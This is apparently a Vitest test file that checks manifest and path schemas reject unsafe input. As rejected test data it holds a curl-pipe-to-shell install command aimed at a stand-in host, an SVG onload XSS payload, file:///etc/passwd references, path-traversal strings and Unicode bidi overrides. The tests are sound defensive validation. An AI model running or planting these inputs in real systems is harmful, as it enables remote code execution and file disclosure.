import { describe, expect, it } from "vitest";
import {
  CoverageLedgerSchema,
  ContainedRelativeSourcePathSchema,
  ProductManifestSchema,
  RouteManifestSchema,
  SafeDisplayLabelSchema,
  SafeRoutePathSchema,
  StateManifestSchema,
} from "../src/index.js";
import {
  coverageLedgerFixture,
  productManifestFixture,
  routeManifestFixture,
  stateManifestFixture,
} from "./fixtures.js";

const BIDI_CONTROL_CODEPOINTS = [
  0x061c,
  0x200e,
  0x200f,
  0x202a,
  0x202b,
  0x202c,
  0x202d,
  0x202e,
  0x2066,
  0x2067,
  0x2068,
  0x2069,
] as const;

describe("ProductManifest", () => {
  it("accepts a deterministic repository manifest with structured commands", () => {
    expect(ProductManifestSchema.parse(productManifestFixture)).toEqual(
      productManifestFixture,
    );
  });

  it("rejects shell strings at the process boundary", () => {
    const result = ProductManifestSchema.safeParse({
      ...productManifestFixture,
      commands: {
        ...productManifestFixture.commands,
        install: "npm ci && curl https://example.test/script | sh",
      },
    });

    expect(result.success).toBe(false);
  });

  it("rejects unsupported framework and import-mode claims", () => {
    expect(
      ProductManifestSchema.safeParse({
        ...productManifestFixture,
        framework: { kind: "unknown-magic", confidence: "verified" },
      }).success,
    ).toBe(false);
    expect(
      ProductManifestSchema.safeParse({
        ...productManifestFixture,
        importMode: "figma",
      }).success,
    ).toBe(false);
  });
});

describe("route and state manifests", () => {
  it("accepts source-owned routes and evidence-backed states", () => {
    expect(RouteManifestSchema.parse(routeManifestFixture)).toEqual(
      routeManifestFixture,
    );
    expect(StateManifestSchema.parse(stateManifestFixture)).toEqual(
      stateManifestFixture,
    );
  });

  it.each([
    "<svg/onload=alert(1)>",
    "[label](file:///etc/passwd)",
    "\u0000control",
    "\u0085control",
    "\u202Eoverride",
    "file:///etc/passwd",
    "/Users/private/project",
    "C:\\private\\project",
  ])("rejects the unsafe display label %j", (label) => {
    expect(SafeDisplayLabelSchema.safeParse(label).success).toBe(false);
  });

  it("preserves safe literal route semantics and rejects unsafe route paths", () => {
    expect(SafeRoutePathSchema.parse("/projects/:projectId")).toBe(
      "/projects/:projectId",
    );
    for (const path of [
      "//evil.test/path",
      "/x<svg>",
      "/x[label](file://host)",
      "/file://etc/passwd",
      "/x\u202Eoverride",
      "/x\u0000control",
    ]) {
      expect(SafeRoutePathSchema.safeParse(path).success).toBe(false);
    }
  });

  it.each(BIDI_CONTROL_CODEPOINTS)(
    "rejects Unicode Bidi_Control U+%s in display labels and route paths",
    (codepoint) => {
      const control = String.fromCodePoint(codepoint);
      expect(
        SafeDisplayLabelSchema.safeParse(`safe${control}label`).success,
      ).toBe(false);
      expect(
        SafeRoutePathSchema.safeParse(`/safe${control}route`).success,
      ).toBe(false);
    },
  );

  it("accepts only canonical contained relative source paths", () => {
    expect(
      ContainedRelativeSourcePathSchema.parse("src/app/routes.tsx"),
    ).toBe("src/app/routes.tsx");

    for (const path of [
      "",
      "/absolute/file.tsx",
      "C:\\absolute\\file.tsx",
      "C:/absolute/file.tsx",
      "\\\\server\\share\\file.tsx",
      "file:///etc/passwd",
      "https://example.test/file.tsx",
      "src/./file.tsx",
      "src/../file.tsx",
      "../file.tsx",
      "src//file.tsx",
      "src/app/",
      "src\\app\\file.tsx",
      " src/app/file.tsx",
      "src/app/file.tsx ",
      "src/app/\u0000file.tsx",
      "src/app/\u0085file.tsx",
      "src/app/\u061cfile.tsx",
      "src/app/\u202efile.tsx",
    ]) {
      expect(
        ContainedRelativeSourcePathSchema.safeParse(path).success,
      ).toBe(false);
    }
  });

  it("applies contained source paths to route and flow provenance", () => {
    expect(
      RouteManifestSchema.safeParse({
        ...routeManifestFixture,
        routes: [
          {
            ...routeManifestFixture.routes[0],
            sourceFile: "file:///tmp/route.tsx",
          },
        ],
      }).success,
    ).toBe(false);
  });

  it("rejects code-owned routes without a source file", () => {
    const route = {
      ...routeManifestFixture.routes[0],
      sourceFile: undefined,
    };

    expect(
      RouteManifestSchema.safeParse({
        ...routeManifestFixture,
        routes: [route],
      }).success,
    ).toBe(false);
  });

  it("requires a source screen only for code-owned routes", () => {
    expect(
      RouteManifestSchema.safeParse({
        ...routeManifestFixture,
        routes: [
          {
            ...routeManifestFixture.routes[0],
            sourceOwnership: "reference-only",
            sourceFile: undefined,
            sourceScreen: undefined,
          },
        ],
      }).success,
    ).toBe(true);
    expect(
      RouteManifestSchema.safeParse({
        ...routeManifestFixture,
        routes: [
          {
            ...routeManifestFixture.routes[0],
            sourceScreen: undefined,
          },
        ],
      }).success,
    ).toBe(false);
  });

  it("rejects duplicate route and state IDs", () => {
    expect(
      RouteManifestSchema.safeParse({
        ...routeManifestFixture,
        routes: [
          routeManifestFixture.routes[0],
          { ...routeManifestFixture.routes[0], path: "/duplicate" },
        ],
      }).success,
    ).toBe(false);
    expect(
      StateManifestSchema.safeParse({
        ...stateManifestFixture,
        states: [
          stateManifestFixture.states[0],
          { ...stateManifestFixture.states[0], name: "duplicate" },
        ],
      }).success,
    ).toBe(false);
  });
});

describe("CoverageLedger", () => {
  it("accepts a verified cell only when evidence is present", () => {
    expect(CoverageLedgerSchema.parse(coverageLedgerFixture)).toEqual(
      coverageLedgerFixture,
    );
    expect(
      CoverageLedgerSchema.safeParse({
        ...coverageLedgerFixture,
        cells: [
          {
            ...coverageLedgerFixture.cells[0],
            evidenceArtifactIds: [],
          },
        ],
      }).success,
    ).toBe(false);
  });

  it.each(["partial", "blocked", "stale", "not-captured"])(
    "requires a reason for %s cells",
    (health) => {
      expect(
        CoverageLedgerSchema.safeParse({
          ...coverageLedgerFixture,
          cells: [
            {
              ...coverageLedgerFixture.cells[0],
              health,
              evidenceLevel: null,
              frameKind: null,
              evidenceArtifactIds: [],
            },
          ],
        }).success,
      ).toBe(false);
    },
  );

  it("keeps not-captured cells instead of silently dropping them", () => {
    const notCaptured = {
      ...coverageLedgerFixture.cells[0],
      health: "not-captured",
      evidenceLevel: null,
      frameKind: null,
      reason: "capture-cell-budget-exceeded",
      evidenceArtifactIds: [],
    };

    const parsed = CoverageLedgerSchema.parse({
      ...coverageLedgerFixture,
      cells: [notCaptured],
    });
    expect(parsed.cells).toHaveLength(1);
    expect(parsed.cells[0]?.health).toBe("not-captured");
  });
});

describe("strict manifest boundaries", () => {
  it.each([
    [ProductManifestSchema, productManifestFixture],
    [RouteManifestSchema, routeManifestFixture],
    [StateManifestSchema, stateManifestFixture],
    [CoverageLedgerSchema, coverageLedgerFixture],
  ] as const)("rejects unknown top-level fields", (schema, fixture) => {
    expect(
      schema.safeParse({ ...fixture, providerSpecific: true }).success,
    ).toBe(false);
  });
});
